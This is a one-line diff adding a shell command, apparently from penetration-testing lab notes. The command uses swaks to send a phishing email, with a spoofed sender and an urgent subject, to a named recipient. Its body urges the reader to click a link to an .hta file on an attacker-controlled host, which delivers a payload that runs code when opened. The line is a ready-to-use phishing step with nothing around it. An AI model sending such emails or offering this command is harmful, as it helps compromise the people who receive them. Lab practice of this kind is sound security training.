@@ -1,0 +1,1 @@
+swaks --body 'click me http://192.168.45.240/file.hta' --add-header "Really: 1.0" --add-header "Content-Type: text/html" --header "Subject: Important" -t Will@tricky.com -f attacker@corp.com --server 192.168.169.159
